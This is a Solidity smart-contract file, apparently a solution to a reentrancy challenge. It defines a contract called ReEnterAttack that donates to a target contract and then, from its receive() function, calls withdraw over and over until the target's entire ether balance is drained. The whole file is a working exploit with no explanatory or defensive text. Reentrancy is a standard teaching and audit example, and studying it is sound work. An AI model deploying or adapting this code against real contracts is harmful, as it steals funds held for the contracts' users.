// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntReEnter {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract ReEnterAttack {
    IntReEnter public reEnter;

    constructor(address target) {
        reEnter = IntReEnter(target);
    }

    function callWithdraw(uint256 amount) public  {
        reEnter.withdraw(amount);
    }

    function callDonate() public payable {
        reEnter.donate{value: msg.value}(address(this));
    }

    function callBalanceOf(address target) public view returns (uint256 balance) {
        return reEnter.balanceOf(target);
    }

    receive() external payable {
        uint256 myBalance = callBalanceOf(address(this));
        uint256 targetBalance = address(reEnter).balance;

        if (targetBalance > 0 ) {
            if (myBalance < targetBalance) {
                callWithdraw(myBalance);
            } else {
                callWithdraw(targetBalance);
            }
        }
    }
}
